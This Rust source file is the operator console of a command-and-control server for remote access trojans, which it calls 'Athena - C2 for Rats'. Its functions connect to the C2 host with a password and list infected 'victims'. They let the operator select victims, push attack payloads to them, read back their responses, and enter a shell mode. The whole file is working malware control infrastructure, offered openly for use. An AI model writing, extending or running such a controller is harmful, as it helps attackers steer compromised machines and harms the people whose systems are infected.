/*
 * Copyright (C) 2021  Aravinth Manivannan <realaravinth@batsense.net>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
use std::io::{stdin, BufWriter, Write};
use std::mem;

use libathena::{
    payload::attack::{self, PayloadID},
    AthenaClient, AthenaClientBuilder, AthenaResult, Client,
};

pub mod commands;
pub mod errors;
pub mod handlers;
pub mod options;

const DEFAULT_PROMPT: &str = "(athena)";
const SHELL_PROMPT: &str = "(shell)";
const TARGET_ALL: &str = "(all)";

pub const VERSION: &str = env!("CARGO_PKG_VERSION");

use commands::Commands;
use errors::*;

/// Different "modes" in which the applications can operate at
#[derive(Debug, PartialEq, Clone)]
pub enum Mode {
    Default,
    TargetAll,
    Shell,
    Exit,
}

impl Mode {
    /// Runner method to print shell prompt, read input and parse the input
    /// to set the relevant mode. It also returns the Command that matches user input
    pub fn print_and_read<W: Write>(
        &self,
        s: &mut State<W>,
        i: &mut String,
    ) -> CliResult<Commands> {
        match self {
            Self::Default => {
                s.default_prompt()?;
                Self::read_input(i)?;
            }

            Self::Shell => {
                s.shell_prompt()?;
                Self::read_input(i)?;
            }

            Self::TargetAll => {
                s.targetall_prompt()?;
                Self::read_input(i)?;
            }

            Self::Exit => (),
        }

        let cmd = Commands::parse_and_set_mode(s, i)?;
        Ok(cmd)
    }

    /// runner method to read input from STDIN
    fn read_input(input: &mut String) -> CliResult<()> {
        input.clear();
        stdin().read_line(input)?;
        Ok(())
    }
}

/// Application state
pub struct State<W: Write> {
    pub write: BufWriter<W>,
    pub mode: Mode,
    pub client: AthenaClient,
    pub available_victims: Vec<attack::Victim>,
    pub selected_victims: Vec<attack::Victim>,
    pub editor: Option<String>,
    // (PayloadID, Victim name)
    pub payload_ids: Vec<(PayloadID, String)>,
}

impl<W: Write> State<W> {
    /// Create new state
    pub async fn new(write: W, options: &options::Options) -> AthenaResult<Self> {
        let write = BufWriter::new(write);
        let mode = Mode::Default;

        let client = AthenaClientBuilder::default()
            .client(Client::builder())?
            .password(options.password.clone())
            .host(options.c2.clone())
            .build()?;

        let available_victims = client.attack_list_victims().await?;
        let selected_victims = client.attack_list_victims().await?;

        let payload_ids = Vec::new();

        Ok(Self {
            write,
            mode,
            client,
            available_victims,
            selected_victims,
            editor: options.editor.clone(),
            payload_ids,
        })
    }

    /// Get list of victims from the server
    pub async fn refresh_victims(&mut self) -> AthenaResult<()> {
        self.available_victims = self.client.attack_list_victims().await?;
        Ok(())
    }

    /// print welcome message
    pub fn welcome(&mut self) -> CliResult<()> {
        writeln!(
            self.write,
            r#"Athena {} - C2 for Rats
Aravinth Mavnivannan<realaravinth@batsense.net>
Be nice."#,
            VERSION,
        )?;
        Ok(())
    }

    /// print default prompt
    pub fn default_prompt(&mut self) -> CliResult<()> {
        write!(self.write, "{} => ", DEFAULT_PROMPT)?;
        self.write.flush()?;
        Ok(())
    }

    /// Print shell prompt
    pub fn shell_prompt(&mut self) -> CliResult<()> {
        write!(self.write, "{}{}", DEFAULT_PROMPT, SHELL_PROMPT)?;
        self.write.flush()?;
        Ok(())
    }

    /// Print prompt when the application is set to target all victims on the C2 server
    pub fn targetall_prompt(&mut self) -> CliResult<()> {
        write!(self.write, "{}{}", DEFAULT_PROMPT, TARGET_ALL)?;
        self.write.flush()?;
        Ok(())
    }

    /// Lists all the victims that are registered on the C2 server
    pub fn list_victims(&mut self) -> CliResult<()> {
        if self.available_victims.is_empty() {
            writeln!(self.write, "No victims on C2 server")?;
        } else {
            writeln!(self.write, "Victims")?;
            writeln!(self.write, "=======")?;
            for (count, victim) in self.available_victims.iter().enumerate() {
                writeln!(self.write, "[{}] {}", count, victim.name)?;
            }
        }
        self.write.flush()?;
        Ok(())
    }

    /// Runner method to select all victims. Should be called after calling Self::list_victims
    /// as the user will have to see the victim list first before making their choices
    pub fn select_victim(&mut self, input: &mut String) -> CliResult<()> {
        writeln!(self.write, "Pick a victim or choose all")?;
        self.mode.clone().print_and_read(self, input)?;
        let victims = vec![self
            .available_victims
            .get(input.trim().parse::<usize>().unwrap())
            .unwrap()
            .to_owned()];
        self.selected_victims = victims;
        Ok(())
    }

    /// Upload payload to all selected victims
    pub async fn upload_payload(&mut self, payload: &mut attack::Payload) -> CliResult<()> {
        for victim in self.selected_victims.iter() {
            payload.victim = victim.name.to_owned();
            let id = self.client.attack_set_payload(&payload).await?;
            let name = mem::take(&mut payload.victim);
            self.payload_ids.push((id, name));
        }
        Ok(())
    }

    /// Read victim response to all registered payloads from the C2 server
    pub async fn read_responses(&mut self) -> CliResult<()> {
        for (id, name) in self.payload_ids.iter() {
            let resp = self.client.attack_read_response(&id).await?;
            if let Some(response) = resp.response {
                write!(self.write, "({}) => {}", &name, &response)?;
            }
        }
        self.write.flush()?;
        Ok(())
    }
}
